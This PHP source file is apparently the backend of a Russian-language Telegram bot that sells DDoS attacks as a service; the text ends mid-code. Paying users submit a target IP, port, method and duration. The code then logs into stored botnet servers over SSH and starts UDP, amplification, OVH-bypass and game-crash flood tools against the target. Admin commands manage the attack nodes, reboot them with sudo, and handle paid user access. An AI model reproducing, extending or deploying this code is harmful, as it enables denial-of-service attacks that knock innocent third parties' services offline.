<?php

    header('Content-Type: application/json');

    include 'config.php';
    include 'API/tgLib.php';

    if (isset($_GET['key'])) {

        if ($_GET['key'] !== $get_config['key']) {

            print_R (

                json_encode (

                    array (

                        "message" => "Wrong key",

                    ),

                )

            );

            return false;

        }

    } else {

        print_R (

            json_encode (

                array (

                    "message" => "Parameter key not specified",

                ),

            )

        );

        return false;

    }

    if (isset($_GET['set'])) {

        if ($_GET['set'] == 'true') {

            $array = [

                "url" => 'https://' . $_SERVER['HTTP_HOST'] . explode('?', $_SERVER['REQUEST_URI'])[0] . "?key=" . $get_config['key'],

            ];

            $ch = curl_init("https://api.telegram.org/bot" . $get_config['token'] . "/setWebhook?" . http_build_query($array));

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);

            $result = curl_exec($ch);

            curl_close($ch);

            print_R($result);

            return false;

        } else if ($_GET['set'] == 'false') {

            $ch = curl_init("https://api.telegram.org/bot" . $get_config['token'] . "/setWebhook");

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);

            $result = curl_exec($ch);

            curl_close($ch);

            print_R($result);

            return false;

        } else {

            print_R (

                json_encode (

                    array (

                        "message" => "the set argument is not specified correctly - (true\false)",

                    ),

                )

            );

            return false;

        }

    }

    print_R (

        json_encode (

            array (

                "message" => "What the hell do you need?",

            ),

        )

    );

    $totalTraffic = 0;
    $bot = new tgBot($get_config['token']);
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (!$data) die;

    $text = $data['message']['text'];
    $chat = $data['message']['chat']['id'];
    $id = $data['message']['from']['id'];
    $first_name = $data['message']['from']['first_name'];

    if ($data['message']['reply_to_message']['from']['id']) {

        $reply_author = $data['message']['reply_to_message']['from']['id'];

    }

    if ($data['message']['reply_to_message']['message_id']) {

        $reply_message_id = $data['message']['reply_to_message']['message_id'];

    }

    function addTraffic($traffic) {

        static $totalTraffic = 0;
        $totalTraffic += $traffic;

        return $totalTraffic;

    }

    function onDecode($text, $key, $cipher) {

        $base64_decode = base64_decode($text);
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($base64_decode, 0, $ivlen);
        $hmac = substr($base64_decode, $ivlen, $sha2len = 32);
        $raw = substr($base64_decode, $ivlen + $sha2len);
        $decode = openssl_decrypt($raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $calcmac = hash_hmac('sha256', $raw, $key, $as_binary = true);

        if (hash_equals($hmac, $calcmac)) {

            return $decode;

        }

        return false;

    }

    function gen_token($length = 6) {

        $token = '';

        $arr = array (

            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'

        );

        for ($i = 0; $i < $length; $i++) {

            $token .= $arr[random_int(0, count($arr) - 1)];

        }

        return $token;

    }

    if ($text) {

        $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/status.php");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);

        $response = curl_exec($ch);

        curl_close($ch);

        if (!(in_array($id, $get_config['admin_ids']))) {

            if (!(in_array($id, $get_config['wl_ids']))) {

                if (json_decode($response, true)['response'] == '0') {

                    $bot->sendMessageButtonURL($chat, $get_config['tag'] . " - В данный момент у бота не рабочие время. Бот работает с (" . $get_config['time_start'] . ") до (" . $get_config['time_stop'] . ") по часовому поясу Красноярского края. Повторите попытку чуть позже или обратитесь за помощью к разработчику.", "💎 Разработчик.", $get_config['tg']);

                    return true;

                }

            }

        }

        if (in_array($id, $get_config['admin_ids'])) {

            if (!(file_exists(__DIR__ . "/API/json/" . $get_config['users_file']))) {

                file_put_contents(__DIR__ . "/API/json/" . $get_config['users_file'], "[]");

                $bot->reply($chat, $get_config['tag'] . " - Файл " . $get_config['users_file'] . " создан используйте:\n\n - /user add " . $id . " \n\nЧтобы добавить себя в список пользователей.");

                return true;

            } else if (!(file_exists(__DIR__ . "/API/json/" . $get_config['block_file']))) {

                file_put_contents(__DIR__ . "/API/json/" . $get_config['block_file'], "[]");

                $bot->reply($chat, $get_config['tag'] . " - Файл " . $get_config['users_file'] . " создан используйте:\n\n - /wlip add 1.1.1.1 \n\nЧтобы добавить IP адрес в чёрный список.");

                return true;

            } else if (!(file_exists(__DIR__ . "/API/json/" . $get_config['botnet_file']))) {

                file_put_contents(__DIR__ . "/API/json/" . $get_config['botnet_file'], "[]");

                $bot->reply($chat, $get_config['tag'] . " - Файл " . $get_config['botnet_file'] . " создан используйте:\n\n - /botnet add\n\nЧтобы добавить ноду в список.");

                return true;

            }

        }

        $get_users = json_decode(file_get_contents(__DIR__ . "/API/json/" . $get_config['users_file']), true);
        $get_block_ip = json_decode(file_get_contents(__DIR__ . "/API/json/" . $get_config['block_file']), true);
        $get_botnet = json_decode(file_get_contents(__DIR__ . "/API/json/" . $get_config['botnet_file']), true);

        $message = explode(" ", $text);

        function isLocalIP($ip) {

            $localIpPrefixes = [
                '10.',
                '127.0.',
                '172.16.',
                '172.17.',
                '172.18.',
                '172.19.',
                '172.20.',
                '172.21.',
                '172.22.',
                '172.23.',
                '172.24.',
                '172.25.',
                '172.26.',
                '172.27.',
                '172.28.',
                '172.29.',
                '172.30.',
                '172.31.',
                '192.168.'
            ];

            foreach ($localIpPrefixes as $prefix) {

                if (strpos($ip, $prefix) === 0) {

                    return true;

                }

            }

            return false;

        }

        if (preg_match("/[!\/\?]ddos/", strtolower($message[0]))) {

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            if ($message[1] == null and $message[1] == "") {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /ddos 1.1.1.1.");

                return true;

            } else if (!(filter_var($message[1], FILTER_VALIDATE_IP))) {

                $bot->reply($chat, $get_config['tag'] . " - Неверно введен айпи адрес используйте - (1.0.0.1).");

                return true;

            } else if (array_key_exists($message[1], $get_block_ip)) {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя ддосить данный айпи адрес.");

                return true;

            } else if ($message[2] == null and $message[2] == "") {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя порт оставлять пустым,\n\n{!} Пример :: /ddos 1.1.1.1 53");

                return true;

            } else if (!(is_numeric($message[2]))) {

                $bot->reply($chat, $get_config['tag'] . " - Неверно введен порт используйте - (25565,19132,27015).");

                return true;

            } else if ($message[3] == null and $message[3] == "") {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя метод оставлять пустым,\n\n{!} Пример :: /ddos 1.1.1.1 53 AMP");

                return true;

            } else if (!(in_array($message[3], $get_config['methods']))) {

                $bot->reply($chat, $get_config['tag'] . " - Метод не найден используйте - /methods.");

                return true;

            } else if ($message[4] == null and $message[4] == "") {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя оставлять аргумент time пустым,\n\n{!} Пример :: /ddos 1.1.1.1 53 AMP 300");

                return true;

            } else if (!(is_numeric($message[4]))) {

                $bot->reply($chat, $get_config['tag'] . " - Неверно введен аргумент time используйте - (300,500,750).");

                return true;

            } else if (isLocalIP($message[2])) {

                $bot->reply($chat, $get_config['tag'] . " - Error");

                return true;

            } else if ($message[4] > $get_config['max_time']) {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать число большее " . $get_config['max_time']);

                return true;

            } else if ($message[4] <= 0) {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать отрицательное число");

                return true;

            } else if ($message[4] < 60) {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать меньшее число чем 60");

                return true;

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

                if (empty($get_botnet)) {

                    $bot->reply($chat, $get_config['tag'] . " - Список машин пустой добавьте машину,\n\n{!} Пример :: /botnet add.");

                    return false;

                }

                foreach ($get_botnet as $key => $value) {

                    $connection = ssh2_connect(onDecode($value['ip'], $get_config['key'], "AES-128-CBC"), onDecode($value['port'], $get_config['key'], "AES-128-CBC"));

                    $auth = ssh2_auth_password($connection, onDecode($value['login'], $get_config['key'], "AES-128-CBC"), onDecode($value['password'], $get_config['key'], "AES-128-CBC"));

                    $screen_list = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}'");

                    stream_set_blocking($screen_list, true);

                    $screen_pid = stream_get_contents($screen_list);

                    if (!empty($screen_pid)) {

                        $bot->reply($chat, $get_config['tag'] . " - Атака уже запущена попробуйте позже.");

                        return true;

                    }

                    $ch = curl_init("http://ip-api.com/json/" . $message[1]);

                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $get_json = curl_exec($ch);

                    curl_close($ch);

                    $get_org = json_decode($get_json, true)['org'];
                    $get_as = json_decode($get_json, true)['as'];
                    $get_isp = json_decode($get_json, true)['isp'];

                    if (in_array($get_org, $get_config['company'])) {

                        $bot->reply($chat, $get_config['tag'] . " - Данную компанию\n\n- IP :: " . $message[1] . ",\n- As :: " . $get_as . ",\n- Org :: " . $get_org . ".\n\nНельзя атаковать.");

                        return false;

                    }

                    if ($message[3] == "UDP") {
                            
                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-UDP-BYPASS timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/udp-bypass " . $message[1] . " " . $message[2] . " 750 750 " . $message[4]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-UDP-BYPASS-V2 timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/udp-bypass-v2 " . $message[1] . " " . $message[2]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-FL timeout --foreground -k 10 -s SIGKILL " . $message[4] . " python3 /root/methods/fli.py " . $message[1] . " " . $message[2]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-SUDP timeout --foreground -k 10 -s SIGKILL " . $message[4] . " perl /root/methods/god.pl " . $message[1] . " " . $message[2] . " 65500 " . $message[4]);

                    } else if ($message[3] == "STRESSER") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-STCP timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/stress " . $message[1] . " " . $message[2] . " 1 750 " . $message[4] . " 5");

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-SUDP timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/stress " . $message[1] . " " . $message[2] . " 2 750 " . $message[4] . " 5");

                    } else if ($message[3] == "OVH") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-FL timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/OVH-FLIDR " . $message[1] . " " . $message[2] . " 950 950 " . $message[4]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-MT timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/MertOVH " . $message[1] . " " . $message[2]);

                    } else if ($message[3] == "HOME") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-HOME timeout --foreground -k 10 -s SIGKILL " . $message[4] . " perl /root/methods/home.pl " . $message[1] . " " . $message[2] . " 95500 " . $message[4]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-FL timeout --foreground -k 10 -s SIGKILL " . $message[4] . " python3 /root/methods/fli.py " . $message[1] . " " . $message[2]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-GC timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/GAME-CRASH " . $message[1] . " " . $message[2]);

                    } else if ($message[3] == "AMP") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-AMP timeout --foreground -k 10 -s SIGKILL " . $message[4] . " ./methods/OVH-AMP " . $message[1] . " " . $message[2]);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-AMP timeout --foreground -k 10 -s SIGKILL " . $message[4] . " perl /root/methods/AMP.pl " . $message[1] . " " . $message[2] . " 10000 " . $message[4]);
                        
                    }

                    

                }

                if ($stream) {

                    $bot->reply($chat, $get_config['tag'] . " - Атака успешно началась на >> " . $message[1] . ":" . $message[2] . " " . $message[4] . "/s.");

                    $bot->sticker($chat, "CAACAgIAAxkBAAEF2IJmW_1CQcgZXvfu7eB7gDhCoRtfggAC1gADVp29Cgl1yQziLyEKNQQ");

                    return true;

                } else if (!$auth) {

                    $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен.", "https://i.ibb.co/gvQLVKz/error.png");

                    return true;

                } else if (!$connection) {

                    $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось установить соединение с сервером.", "https://api.whost.su/tg/img/error.jpg");

                    return true;

                }

                fclose($stream);

                ssh2_disconnect($connection);

                return true;

            }

        } else if (preg_match("/[!\/\?]methods/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            $bot->pictureReply($chat, $get_config['tag'] . " Методы ддоса:\n\n" . implode(", ", $get_config['methods']) . ".\n\nВыберите метод с умом.", "https://i.ibb.co/gzXJ7rh/bot-methods.png");

            return true;

        } else if (preg_match("/[!\/\?]getid/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            $bot->reply($chat, $get_config['tag'] . " - Ваш айди: " . $id);

            return true;

        } else if (preg_match("/[!\/\?]botnet/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (in_array($id, $get_config['admin_ids'])) {

                if (strtolower($message[1]) == "add") {

                    if (count($get_botnet) >= 6) {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя добавлять больше шести машин.");

                        return true;

                    }

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя название оставлять пустым,\n\n{!} Пример :: /botnet add vds-v1.");

                        return true;

                    }

                    if ($message[3] == null and $message[3] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /botnet add vds-v1 192.168.0.1.");

                        return true;

                    } else if (!(filter_var($message[3], FILTER_VALIDATE_IP))) {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать буквы или спецсимволы в айпи адресе.");

                        return true;

                    }

                    if ($message[4] == null and $message[4] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя порт оставлять пустым,\n\n{!} Пример :: /botnet add vds-v1 192.168.0.1 22.");

                        return true;

                    } else if (!ctype_digit($message[4])) {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать буквы или спецсимволы в порте.");

                        return true;

                    }

                    if ($message[5] == null and $message[5] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя логин оставлять пустым,\n\n{!} Пример :: /botnet add vds-v1 127.0.0.1 22 root.");

                        return true;

                    }

                    if ($message[6] == null and $message[6] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя пароль оставлять пустым,\n\n{!} Пример :: /botnet add vds-v1 127.0.0.1 22 root password.");

                        return true;

                    }

                    $array = array (

                        "name" => $message[2],
                        "ip" => $message[3],
                        "login" => $message[5],
                        "port" => $message[4],
                        "password" => $message[6],
                        "method" => "add",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/botnet.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "edit") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя название оставлять пустым,\n\n{!} Пример :: /botnet edit vds-v1.");

                        return false;

                    }

                    if ($message[3] == null and $message[3] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /botnet edit vds-v1 127.0.0.1.");

                        return false;

                    } else if (!(filter_var($message[3], FILTER_VALIDATE_IP))) {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать буквы или спецсимволы в айпи адресе.");

                        return false;

                    }

                    if ($message[4] == null and $message[4] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя порт оставлять пустым,\n\n{!} Пример :: /botnet edit vds-v1 127.0.0.1 22.");

                        return false;

                    } else if (!ctype_digit($message[4])) {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя использовать буквы или спецсимволы в порте.");

                        return false;

                    } 

                    if ($message[5] == null and $message[5] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя логин оставлять пустым,\n\n{!} Пример :: /botnet edit vds-v1 127.0.0.1 22 root.");

                        return false;

                    }

                    if ($message[6] == null and $message[6] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя пароль оставлять пустым,\n\n{!} Пример :: /botnet edit vds-v1 127.0.0.1 22 root password.");

                        return false;

                    }

                    $array = array (

                        "name" => $message[2],
                        "ip" => $message[3],
                        "login" => $message[5],
                        "port" => $message[4],
                        "password" => $message[6],
                        "method" => "edit",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/botnet.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "del") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя название оставлять пустым,\n\n{!} Пример :: /botnet del vds-v1.");

                        return false;

                    }

                    $array = array (

                        "name" => $message[2],
                        "method" => "del",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/botnet.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "restart") {

                    if (in_array($id, $get_config['admin_ids'])) {

                        if ($message[2] == null and $message[2] == "") {

                            $bot->reply($chat, $get_config['tag'] . " - Нельзя название оставлять пустым,\n\n{!} Пример :: /botnet restart (name/all).");

                            return false;

                        }

                        $serversToRestart = [];

                        foreach ($get_botnet as $serverName => $serverDetails) {

                            if ($serverName === $message[2]) {

                                $serversToRestart[] = $serverDetails;

                            }

                        }

                        if (!empty($serversToRestart)) {

                            foreach ($serversToRestart as $server) {

                                $connection = ssh2_connect(onDecode($server['ip'], $get_config['key'], "AES-128-CBC"), onDecode($server['port'], $get_config['key'], "AES-128-CBC"));

                                $auth = ssh2_auth_password($connection, onDecode($server['login'], $get_config['key'], "AES-128-CBC"), onDecode($server['password'], $get_config['key'], "AES-128-CBC"));

                                $stream = ssh2_exec($connection, "echo " . onDecode($server['password'], $get_config['key'], "AES-128-CBC") . " | sudo -S reboot");

                            }

                            if ($stream) {

                                $bot->reply($chat, $get_config['tag'] . " - Сервер успешно поставлен на перезагрузку ожидайте перед началом атаки проверьте доступность сервера командой - /status.\n\nПримерное время ожидание 5 минут.");

                                return false;

                            } else if (!$auth) {

                                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен.", "https://i.ibb.co/gvQLVKz/error.png");

                                return false;

                            } else if (!$connection) {

                                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось установить соединение с сервером.", "https://i.ibb.co/gvQLVKz/error.png");

                                return false;

                            }

                            ssh2_disconnect($connection);

                        } else if ($message[2] == "all") {

                            foreach ($get_botnet as $serverName => $serverDetails) {

                                $connection = ssh2_connect(onDecode($serverDetails['ip'], $get_config['key'], "AES-128-CBC"), onDecode($serverDetails['port'], $get_config['key'], "AES-128-CBC"));

                                $auth = ssh2_auth_password($connection, onDecode($serverDetails['login'], $get_config['key'], "AES-128-CBC"), onDecode($serverDetails['password'], $get_config['key'], "AES-128-CBC"));

                                $stream = ssh2_exec($connection, "echo " . onDecode($serverDetails['password'], $get_config['key'], "AES-128-CBC") . " | sudo -S reboot");

                            }

                            if ($stream) {

                                $bot->reply($chat, $get_config['tag'] . " - Сервера успешно поставлены на перезагрузку ожидайте перед началом атаки проверьте доступность серверов командой - /status.\n\nПримерное время ожидание 5 минут.");

                                fclose($stream);

                                return false;

                            } else if (!$auth) {

                                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен.", "https://i.ibb.co/gvQLVKz/error.png");

                                return false;

                            } else if (!$connection) {

                                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось установить соединение с сервером.", "");

                                return false;

                            }

                            ssh2_disconnect($connection);

                        } else {

                            $bot->reply($chat, $get_config['tag'] . " - Не найдено серверов с названием " . $message[2]);

                            return false;

                        }

                    } else {

                        $bot->reply($chat, $get_config['tag'] . " - Данная команда доступна только для администраторов.");

                        return false;

                    }

                } else {

                    $bot->reply($chat, $get_config['tag'] . " - Неправильный аргумент используйте,\n\n{!} Пример :: /botnet (add/del/edit/restart).");

                    return false;

                }

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Данная команда доступна только для администраторов.");

                return false;

            }

        } else if (preg_match("/[!\/\?]wlip/", strtolower($message[0]))) {

            if (in_array($id, $get_config['admin_ids'])) {

                if (strtolower($message[1]) == "add") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /wlip add (Айпи адрес).");

                        return false;

                    }

                    $array = array (

                        "ip" => $message[2],
                        "method" => "add",
                        "key" => $get_config['key'],

                    );

                    $url = 'https://' . $_SERVER['HTTP_HOST'];

                    $ch = curl_init($url . "/tg/API/block_list.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "del") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /wlip del (Айпи адрес).");

                        return false;

                    }

                    $array = array (

                        "ip" => $message[2],
                        "method" => "del",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/block_list.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "list") {

                    $array = array (

                        "method" => "list",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/block_list.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $get_ips = curl_exec($ch);

                    curl_close($ch);

                    if (json_decode($get_ips, true)['message']) {

                        $bot->reply($chat, $get_config['tag'] . " - " . json_decode($get_ips, true)['message']);

                        return true;

                    } else {

                        $bot->reply($chat, $get_config['tag'] . " - Список: \n\n<tg-spoiler>" . $get_ips . "</tg-spoiler>\n Чёрный список айпи адресов.");

                        return true;

                    }

                } else {

                    $bot->reply($chat, $get_config['tag'] . " - Неправильный аргумент используйте - /wlip (add/del/list).");

                    return false;

                }

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Данная команда доступна только для администраторов.");

                return false;

            }

        } else if (preg_match("/[!\/\?]user/", strtolower($message[0]))) {

            if (in_array($id, $get_config['admin_ids'])) {

                $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

                if (strtolower($message[1]) == "add") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айди оставлять пустым,\n\n{!} Пример :: /user add " . mt_rand(0,999999999) . ".");

                        return true;

                    }

                    $array = array (

                        "user_id" => $message[2],
                        "method" => "add",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/users.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return false;

                } else if (strtolower($message[1]) == "del") {

                    if ($message[2] == null and $message[2] == "") {

                        $bot->reply($chat, $get_config['tag'] . " - Нельзя айди оставлять пустым,\n\n{!} Пример :: /user del " . mt_rand(0,999999999) . ".");

                        return true;

                    }

                    $array = array (

                        "user_id" => $message[2],
                        "method" => "del",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/users.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $response = curl_exec($ch);

                    curl_close($ch);

                    $bot->reply($chat, $get_config['tag'] . " - Ответ: " . json_decode($response, true)['message']);

                    return true;

                } else if (strtolower($message[1]) == "list") {

                    $array = array (

                        "method" => "list",
                        "key" => $get_config['key'],

                    );

                    $ch = curl_init("https://" . $_SERVER['HTTP_HOST'] . "/tg/API/users.php");

                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array, '', '&'));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $get_ids = curl_exec($ch);

                    curl_close($ch);

                    if (json_decode($get_ids, true)['message']) {

                        $bot->reply($chat, $get_config['tag'] . " - " . json_decode($get_ids, true)['message']);

                        return true;

                    } else {

                        $bot->reply($chat, $get_config['tag'] . " - Список: \n\n<tg-spoiler>" . $get_ids . "</tg-spoiler>\n Информация пользователей.");

                        return true;

                    }

                } else {

                    $bot->reply($chat, $get_config['tag'] . " - Неправильный аргумент используйте,\n\n{!} Пример :: /user (add/del/list).");

                    return false;

                }

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Данная команда доступна только для администраторов.");

                return false;

            }

        } else if (preg_match("/[!\/\?]nmap/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            $array_key = array (

